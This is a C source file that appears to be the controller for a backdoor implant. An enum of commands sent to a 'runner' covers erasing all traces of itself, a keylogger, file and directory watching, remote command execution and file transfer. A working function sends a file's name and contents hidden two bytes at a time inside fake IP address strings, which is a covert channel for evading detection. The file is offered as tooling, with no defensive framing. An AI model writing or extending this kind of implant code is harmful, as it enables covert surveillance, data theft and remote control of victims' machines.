#include "commands.h"
#include "network.h"

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DATA_BUF_SIZE 8192

enum command_type {
    CMD_UNINSTALL = 0,              // tell runner to erase all trace including itself

    CMD_REQ_FILE_NAME,              // command to request a file by file name
    REP_REQ_FILE_NAME,              // reply to a request for a file (file name), is this even needed?
    REP_REQ_FILE_DATA,              // reply to a request for a file (data)

    CMD_SEND_FILE_NAME,             // command to send a file (file name)
    CMD_SEND_FILE_DATA,             // command to send a file (data)

    CMD_START_KL,                   // command to start keylogger
    CMD_START_WATCH_FILE,           // command to start watching file
    CMD_START_WATCH_DIR,            // command to start watching dir
    CMD_STOP,                       // command to stop whichever ongoing command it's doing

    CMD_REMOTE_RUN,                 // command to run a command line

    CMD_DISCONNECT                  // command to tell runner to go back to sleep
};

int prompt_stdin(char *buffer, int buf_size) {
    if (fgets(buffer, buf_size, stdin) != NULL) {
        buffer[strcspn(buffer, "\n")] = '\0';
        return 0;
    }
    return -1;
}

int cmd_send_file(struct Context *ctx) {
    const int BUF_SIZE = 256;
    char file_path[BUF_SIZE];
    printf("Enter relative file path: ");
    prompt_stdin(file_path, BUF_SIZE);
    printf("File path: %s\n", file_path);

    const int file_fd = open(file_path, O_RDONLY);
    if (file_fd < 0) {
        fprintf(stderr, "open file failed\n");
        return -1;
    }

    char ip_buffer[IP_ADDR_LEN] = {0};
    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
    int ret;
    size_t len;

    // send CMD_SEND_FILE_NAME
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_SEND_FILE_NAME);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);
    // send file name
        // while not end of string, get the next two bytes, encode, ship it
    len = strlen(file_path);
    for (size_t i = 0; i < len; i+=2) {
        if (i == len-1) {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], 0);
        } else {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], file_path[i+1]);
        }
        if (ret < 0) {
            fprintf(stderr, "encode data failed\n");
        }
        send_packet(ctx, ip_buffer);
    }
    // send TERM
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // send CMD_SEND_FILE_DATA
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_SEND_FILE_DATA);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);
    // send file data
        // while not eod, get the next two bytes, encode, ship it

    ssize_t bytes_read;
    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
        for (ssize_t i = 0; i < bytes_read; i += 2) {
            if (i == bytes_read - 1) {
                // Only one byte left
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
            } else {
                // Two bytes available
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
            }
            if (ret < 0) {
                fprintf(stderr, "encode data failed\n");
            }
            send_packet(ctx, ip_buffer);
        }
    }

    // send TERM
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // might need a strong wait here

    return 0;
}

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4) {
    return sprintf(buffer, "%u.%u.%u.%u", byte1, byte2, byte3, byte4);
}

